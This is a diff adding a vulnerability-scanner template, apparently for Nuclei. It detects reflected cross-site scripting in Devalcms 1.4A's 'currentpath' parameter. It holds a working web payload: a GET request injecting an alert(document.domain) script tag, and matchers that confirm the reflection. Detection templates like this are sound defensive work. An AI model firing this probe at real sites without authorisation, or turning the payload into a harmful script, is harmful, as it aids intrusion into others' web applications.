@@ -1,0 +1,31 @@
+id: devalcms-xss
+info:
+  author: arafatansari
+  description: 'Devalcms 1.4A is affected by Cross-Site Scripting (rXSS) in the ''currentpath''
+    parameter of the index.php file.
+
+    '
+  metadata:
+    verified: true
+  name: Devalcms 1.4A - Cross-Site Scripting
+  reference:
+  - https://www.exploit-db.com/exploits/6369
+  severity: medium
+  tags: devalcms,xss,cms
+requests:
+- matchers:
+  - part: body
+    type: word
+    words:
+    - 'sub menu for: <script>alert(document.domain)</script>'
+  - part: header
+    type: word
+    words:
+    - text/html
+  - status:
+    - 500
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/index.php?currentpath=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
